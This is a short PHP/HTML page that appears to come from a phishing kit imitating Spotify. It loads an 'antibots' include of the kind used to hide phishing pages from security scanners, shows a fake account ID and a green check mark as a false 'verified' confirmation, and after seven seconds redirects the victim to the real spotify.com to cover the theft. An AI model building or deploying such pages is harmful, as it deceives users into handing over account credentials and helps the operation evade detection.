<?php
include '_data_/antibots.php';
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Account ID 704-852-917-371</title>
<link href="_data_/favicon.png" rel="icon" sizes="128x128" type="image/png">
<link href="_data_/sec.css" rel="stylesheet">
<script type="text/javascript">
  setTimeout(function(){
    location = 'https://www.spotify.com'
  },7000)
</script>
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:724px;top:0px;width:475px;height:419px;z-index:2;">
<div id="wb_Image2" style="position:absolute;left:209px;top:121px;width:56px;height:56px;z-index:0;">
<img src="_data_/5847e97bcef1014c0b5e4824.png.crdownload" id="Image2" alt="" width="56" height="56"></div>
<div id="wb_Image1" style="position:absolute;left:172px;top:177px;width:131px;height:131px;z-index:1;">
<img src="_data_/check.jpg" id="Image1" alt="Green check mark icon. Green tick symbol, round checkmark sign. Vector check icon" title="Green check mark icon. Green tick symbol, round checkmark sign. Vector check icon" width="131" height="131"></div>
</form>
</div>
</body>
</html>